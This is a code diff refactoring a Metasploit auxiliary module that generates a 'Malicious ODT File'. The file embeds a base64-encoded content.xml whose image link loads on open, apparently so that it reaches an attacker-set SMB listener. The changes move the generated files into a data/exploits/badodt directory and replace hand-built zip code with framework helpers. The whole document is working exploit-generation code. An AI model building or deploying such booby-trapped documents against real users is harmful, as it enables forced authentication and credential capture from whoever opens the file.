@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       #Display Status Messages
       print_status("Generating Malicious ODT File ")
-      print_status("SMB Listener Address will be set to "+datastore['LISTENER']+"\n")
+      print_status("SMB Listener Address will be set to "+datastore['LISTENER'])
 
       #Create File Content
       createfilecontent()
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
       contentxml3="L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="
 
       #Write content.xml out to disk
-      open((File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','content.xml')), 'w') { |f|
+      open((File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','content.xml')), 'w') { |f|
         f.puts (Base64.decode64(contentxml1)+contentxml2+Base64.decode64(contentxml3))
         f.close
       }
@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
       creator=datastore['CREATOR']
 
       #Write meta.xml out to disk
-      open((File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','meta.xml')), 'w') { |f|
+      open((File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','meta.xml')), 'w') { |f|
         f.puts (Base64.decode64(metaxml1)+creator+Base64.decode64(metaxml2)+creator+Base64.decode64(metaxml3))
         f.close
       }
@@ -80,43 +80,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def createzip()
     begin
-      # Create ODT File/Zip Archieve
-      zip = Rex::Zip::Archive.new
 
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','content.xml'))
-      zip.add_file('content.xml', buf)
+      files =
+      [
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','content.xml')), fname: 'content.xml'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','manifest.rdf')), fname: 'manifest.rdf'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','meta.xml')), fname: 'meta.xml'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','settings.xml')), fname: 'settings.xml'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','styles.xml')), fname: 'styles.xml'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','manifest.xml')), fname: 'META-INF/manifest.xml'},
+        {data: File.read(File.join(Msf::Config.install_root, 'data', 'exploits', 'badodt','thumbnail.png')), fname: 'Thumbnails/thumbnail.png'}
+      ]
 
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','manifest.rdf'))
-      zip.add_file('manifest.rdf', buf)
+      zip = Msf::Util::EXE.to_zip(files)
 
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','meta.xml'))
-      zip.add_file('meta.xml', buf)
-
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','settings.xml'))
-      zip.add_file('settings.xml', buf)
-
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','styles.xml'))
-      zip.add_file('styles.xml', buf)
-
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','manifest.xml'))
-      zip.add_file('META-INF/manifest.xml', buf)
-
-      buf = File.read(File.join(Msf::Config.install_root, 'modules', 'auxiliary', 'odt','thumbnail.png'))
-      zip.add_file('Thumbnails/thumbnail.png', buf)
-
-      path = File.join(Msf::Config.local_directory, datastore['FILENAME'])
-      full_path = ::File.expand_path(path)
-
-      zip.save_to(path)
-      zip.pack
-
-      #Get status of file and output to screen
-      if File.stat(path)
-        #Display status file created showing output path
-        print_good("File Created - "+path+"\n")
-      else
-        print_error("Something didn't go quite right!")
-      end
+      file_create(zip)
 
     end
   end
